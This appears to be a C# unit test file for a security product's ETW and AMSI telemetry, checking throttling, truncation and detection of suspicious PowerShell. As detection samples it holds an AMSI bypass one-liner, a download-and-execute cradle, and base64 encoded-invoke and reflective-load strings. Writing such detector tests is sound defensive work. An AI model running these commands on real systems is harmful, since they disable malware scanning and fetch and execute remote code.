using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using DataVanger.Classification;
using DataVanger.Core;
using DataVanger.Core.Abstractions;
using DataVanger.Core.Domain;
using DataVanger.Detection;
using DataVanger.Engine;
using DataVanger.Memory;
using DataVanger.Memory.Readers;
using DataVanger.Memory.Rules;
using DataVanger.Reputation;
using static DataVanger.Tests.Fixtures.PeFactory;

// Phase 09 decomposition — ETW + AMSI Runtime Integration (legacy section 19). Filter: ~Etw / ~Amsi.
// Faithful verbatim move; private Assert shim -> LegacyAssert.True preserves
// condition + message. Two-way coupling check passed: no earlier-section method
// locals referenced; engine/bus/bridge/etw are block-scoped using-vars (self-contained).
public class EtwAmsiTests
{
    private static void Assert(bool condition, string message) => LegacyAssert.True(condition, message);

    [Xunit.Fact]
    public void EtwAmsiRuntimeIntegration_AllLegacyChecks()
    {
// 19. ETW + AMSI Runtime Integration
// ============================================================================

// 19a. Throttle - drops past per-(kind,pid) ceiling
{
    var throttle = new DataVanger.Runtime.RuntimeTelemetryThrottle(
        maxPerWindow: 3, window: TimeSpan.FromSeconds(5));
    int allowed = 0;
    for (int i = 0; i < 10; i++)
    {
        var ev = new DataVanger.Runtime.RuntimeTelemetryEvent(
            DataVanger.Runtime.RuntimeTelemetryEventKind.ProcessStart,
            providerName: "test", pid: 42, parentPid: 0,
            processName: "x.exe", imagePath: "", commandLine: "", scriptContent: null,
            extraTag: "", timestampUtc: DateTime.UtcNow);
        if (throttle.ShouldAllow(ev)) allowed++;
    }
    Assert(allowed == 3,
        "RuntimeTelemetryThrottle must cap at MaxPerWindow per (kind, pid) within a single window.");
    Assert(throttle.DroppedCount == 7,
        "RuntimeTelemetryThrottle must count drops past the ceiling.");
}

// 19b. Telemetry event truncation
{
    var huge = new string('A', 64 * 1024);
    var ev = new DataVanger.Runtime.RuntimeTelemetryEvent(
        DataVanger.Runtime.RuntimeTelemetryEventKind.AmsiScan,
        providerName: "test", pid: 1, parentPid: 0,
        processName: "ps", imagePath: "", commandLine: huge, scriptContent: huge,
        extraTag: "", timestampUtc: DateTime.UtcNow);
    Assert(ev.CommandLine.Length <= DataVanger.Runtime.RuntimeTelemetryEvent.MaxCommandLineLength,
        "RuntimeTelemetryEvent must truncate oversized command lines.");
    Assert(ev.ScriptContent.Length <= DataVanger.Runtime.RuntimeTelemetryEvent.MaxScriptContentLength,
        "RuntimeTelemetryEvent must truncate oversized script content.");
}

// 19c. Provider factory - graceful degradation defaults to null ETW
{
    using var nullEtw = DataVanger.Runtime.Etw.EtwProviderFactory.Create(
        DataVanger.Runtime.Etw.EtwProviderMode.Auto);
    Assert(nullEtw is DataVanger.Runtime.Etw.NullEtwProvider,
        "EtwProviderFactory.Create(Auto) must fail closed to NullEtwProvider in this build.");
    Assert(!nullEtw.IsHostSupported,
        "NullEtwProvider must report IsHostSupported = false (graceful degradation).");
    var state = nullEtw.Start();
    Assert(state == DataVanger.Runtime.RuntimeProviderState.Unavailable,
        "NullEtwProvider.Start must report Unavailable, never throw.");
    Assert(!nullEtw.IsRunning,
        "NullEtwProvider must never report IsRunning=true.");
}

// 19d. AMSI factory - in-memory analyzer is the default
{
    using var amsi = DataVanger.Runtime.Amsi.AmsiProviderFactory.Create(
        DataVanger.Runtime.Amsi.AmsiProviderMode.Auto);
    Assert(amsi is DataVanger.Runtime.Amsi.InMemoryAmsiProvider,
        "AmsiProviderFactory.Create(Auto) must return the in-memory content analyzer.");
    var state = amsi.Start();
    Assert(state == DataVanger.Runtime.RuntimeProviderState.RunningMock,
        "InMemoryAmsiProvider.Start must report RunningMock.");
    int seen = 0;
    amsi.EventReceived += _ => System.Threading.Interlocked.Increment(ref seen);
    // Benign content - no events.
    int n0 = amsi.SubmitContent("powershell", "Get-Service | Where-Object Status -eq Running", pid: 1);
    Assert(n0 == 0,
        "AMSI must NOT emit events for benign administrative PowerShell content.");

    int nBypass = amsi.SubmitContent("powershell",
        J("[Ref].Assembly.GetType('", "System.Management.", "Automation.", "Amsi", "Utils').GetField('",
          "amsi", "Init", "Failed','NonPublic,Static').SetValue($null,$true)"),
        pid: 2);
    Assert(nBypass >= 1,
        "InMemoryAmsiProvider must emit a telemetry event when an AMSI bypass pattern is submitted.");
    Assert(seen >= 1,
        "InMemoryAmsiProvider must invoke the EventReceived handler on suspicious content.");
}

// 19e. AmsiBypassDetector - explainable reasons
{
    var reasons = DataVanger.Runtime.Amsi.AmsiBypassDetector.Detect(
        J("[Ref].Assembly.GetType('", "System.Management.", "Automation.", "Amsi", "Utils').GetField('",
          "amsi", "Init", "Failed','NonPublic,Static')"));
    Assert(reasons.Count >= 1,
        "AmsiBypassDetector must produce at least one reason for a classic bypass payload.");
    var benign = DataVanger.Runtime.Amsi.AmsiBypassDetector.Detect("Get-ChildItem C:\\");
    Assert(benign.Count == 0,
        "AmsiBypassDetector must NOT flag benign administrative PowerShell.");
}

// 19f. Bridge - ETW process events reach the behavioral bus
using (var bus = new DataVanger.Behavioral.BehavioralEventBus(capacity: 64))
using (var etw = new DataVanger.Runtime.Etw.InMemoryEtwProvider())
using (var bridge = new DataVanger.Runtime.RuntimeTelemetryBridge(bus))
{
    var received = new System.Collections.Concurrent.ConcurrentBag<DataVanger.Behavioral.BehavioralEvent>();
    using var sub = bus.Subscribe(e => received.Add(e));
    bridge.AttachEtw(etw);
    etw.Start();
    etw.EmitProcessStart(pid: 1234, parentPid: 4, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: J("powershell -Encoded", "Command SGVsbG8= -w hidden"));
    bus.DrainNow();
    Assert(received.Count == 1,
        "RuntimeTelemetryBridge must convert an ETW ProcessStart into a behavioral event.");
    var only = received.First();
    Assert(only.Kind == DataVanger.Behavioral.BehavioralEventKind.ProcessStart && only.Pid == 1234,
        "Bridge must preserve Kind and Pid.");
}

// 19g. Bridge translates AMSI content into behavioral evidence end-to-end
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    using var amsi = new DataVanger.Runtime.Amsi.InMemoryAmsiProvider();
    using var bridge = new DataVanger.Runtime.RuntimeTelemetryBridge(engine.Bus);
    bridge.AttachAmsi(amsi);
    amsi.Start();
    // Seed ancestry for the script-host pid so the rule engine treats it as a real process.
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 5050, parentPid: 0, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: "", targetPath: "", extraTag: "",
        severity: DataVanger.Behavioral.BehavioralSeverity.Info,
        description: "ps", timestampUtc: DateTime.UtcNow));
    int n = amsi.SubmitContent("powershell.exe",
        J("$enc='SGVsbG8='; ", "I", "EX ([System.Text.Encoding]::UTF8.GetString([Convert]::From",
          "Base64String($enc)))"),
        pid: 5050);
    engine.DrainNow();
    Assert(n >= 1,
        "InMemoryAmsiProvider must publish at least one event for encoded+invoke content.");
    var chain = engine.Correlation.GetChainForPid(5050, engine.Ancestry);
    Assert(chain != null && chain.HasAnyEvidence,
        "AMSI script content must reach the behavioral rule engine through the bridge.");
    Assert(chain!.Evidence.All(e => !e.CanConfirmMalware),
        "AMSI-derived behavioral evidence must NEVER be ConfirmedMalware.");
    Assert(chain.Score <= RiskThresholds.High,
        "AMSI-derived behavioral chain score must stay within the HighRisk band.");
}

// 19h. Bridge throttle drops floods
using (var bus = new DataVanger.Behavioral.BehavioralEventBus(capacity: 1024))
using (var etw = new DataVanger.Runtime.Etw.InMemoryEtwProvider())
{
    var throttle = new DataVanger.Runtime.RuntimeTelemetryThrottle(
        maxPerWindow: 5, window: TimeSpan.FromSeconds(5));
    using var bridge = new DataVanger.Runtime.RuntimeTelemetryBridge(bus, throttle);
    bridge.AttachEtw(etw);
    etw.Start();
    for (int i = 0; i < 50; i++)
        etw.EmitProcessStart(pid: 9999, parentPid: 0, processName: "noisy.exe",
            imagePath: "", commandLine: "");
    bus.DrainNow();
    Assert(bridge.PublishedCount == 5,
        "Bridge must publish at most MaxPerWindow events per (kind, pid).");
    Assert(bridge.DroppedByThrottleCount == 45,
        "Bridge must report the dropped count under runtime throttle.");
}

// 19i. RuntimeTelemetryService composes ETW + AMSI and starts cleanly
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    using var svc = new DataVanger.Runtime.RuntimeTelemetryService(engine);
    var status = svc.Start();
    Assert(!status.EtwActive,
        "RuntimeTelemetryService must report ETW inactive on environments without a real provider.");
    Assert(status.AmsiActive,
        "RuntimeTelemetryService must report AMSI active (in-memory analyzer) by default.");
    int n = svc.SubmitAmsiContent("ps", J("Invoke-", "Expression (", "New-Object ", "Net.", "WebClient).Download", "String('http://x/y.ps1')"), pid: 6060);
    engine.DrainNow();
    Assert(n >= 1,
        "RuntimeTelemetryService.SubmitAmsiContent must flow suspicious script content through the bridge.");
}

// 19j. ETW provider lifecycle is idempotent and exception-safe
{
    using var etw = new DataVanger.Runtime.Etw.InMemoryEtwProvider();
    etw.Start();
    etw.Start(); // idempotent
    Assert(etw.IsRunning, "InMemoryEtwProvider.Start must be idempotent.");
    etw.Stop();
    Assert(!etw.IsRunning, "InMemoryEtwProvider.Stop must clear IsRunning.");
    bool emitted = etw.EmitProcessStart(1, 0, "x.exe", "", "");
    Assert(!emitted,
        "InMemoryEtwProvider must NOT emit events after Stop.");
}

// 19k. AMSI content analyzer flags reflective loaders and base64 invokes
{
    var f = DataVanger.Runtime.Amsi.AmsiContentAnalyzer.Analyze("powershell",
        J("[System.", "Reflection.", "Assembly]::", "Load([Convert]::From", "Base64String('TVqQAAMAAAAEAAA...'))"));
    Assert(f.HasTag("reflective-load"),
        "AmsiContentAnalyzer must tag reflective .NET loaders.");
    Assert(f.HasTag("base64-invoke"),
        "AmsiContentAnalyzer must tag FromBase64String payload assembly.");
    var benign = DataVanger.Runtime.Amsi.AmsiContentAnalyzer.Analyze("powershell",
        "Get-ChildItem -Path 'C:\\Users' -Recurse | Select-Object FullName");
    Assert(!benign.HasTag("reflective-load") && !benign.HasTag("base64-invoke")
        && !benign.HasTag("encoded-payload"),
        "AmsiContentAnalyzer must NOT tag benign administrative content.");
}

// 19l. Anti-FP: runtime events alone never confirm malware on a ScanFinding
using (var engine = new DataVanger.Behavioral.BehavioralEngine())
{
    using var amsi = new DataVanger.Runtime.Amsi.InMemoryAmsiProvider();
    using var bridge = new DataVanger.Runtime.RuntimeTelemetryBridge(engine.Bus);
    bridge.AttachAmsi(amsi);
    amsi.Start();
    engine.Bus.Publish(new DataVanger.Behavioral.BehavioralEvent(
        DataVanger.Behavioral.BehavioralEventKind.ProcessStart,
        pid: 7070, parentPid: 0, processName: "powershell.exe",
        imagePath: @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        commandLine: "", targetPath: "", extraTag: "",
        severity: DataVanger.Behavioral.BehavioralSeverity.Info,
        description: "ps", timestampUtc: DateTime.UtcNow));
    amsi.SubmitContent("powershell.exe",
        J("[Ref].Assembly.GetType('", "System.Management.", "Automation.", "Amsi", "Utils').GetField('",
          "amsi", "Init", "Failed','NonPublic,Static').SetValue($null,$true)"),
        pid: 7070);
    engine.DrainNow();

    var runtimeFinding = new ScanFinding
    {
        Path = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Score = RiskThresholds.Suspect,
        Evidence = new List<Evidence>(),
    };
    engine.Apply(runtimeFinding);
    Assert(runtimeFinding.Evidence.All(e => !e.CanConfirmMalware),
        "Runtime/AMSI-derived evidence on a ScanFinding must NEVER be ConfirmedMalware.");
    Assert(ThreatClassificationPolicy.Classify(runtimeFinding) != ThreatClass.ConfirmedMalware,
        "ETW/AMSI telemetry alone must NEVER make ThreatClassificationPolicy return ConfirmedMalware.");
    Assert(!ThreatClassificationPolicy.AllowsAutomaticAction(runtimeFinding),
        "Runtime telemetry alone must NEVER authorize automatic quarantine.");
}
    }
}
